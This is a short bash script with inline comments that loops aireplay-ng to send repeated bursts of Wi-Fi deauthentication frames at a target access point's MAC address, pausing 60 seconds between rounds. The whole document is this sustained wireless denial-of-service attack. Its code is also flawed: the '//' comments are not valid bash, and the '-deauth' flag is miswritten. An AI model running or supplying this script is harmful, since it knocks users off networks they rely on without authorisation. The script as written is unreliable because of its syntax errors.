#!/bin/bash
for i in {1..5000} // creates a for loop that will execute our commands 5,000 times.
do
aireplay-ng -deauth 1000 -a [add target mac here] mon1
sleep 60s // tells the script to sleep for 60 seconds.
done
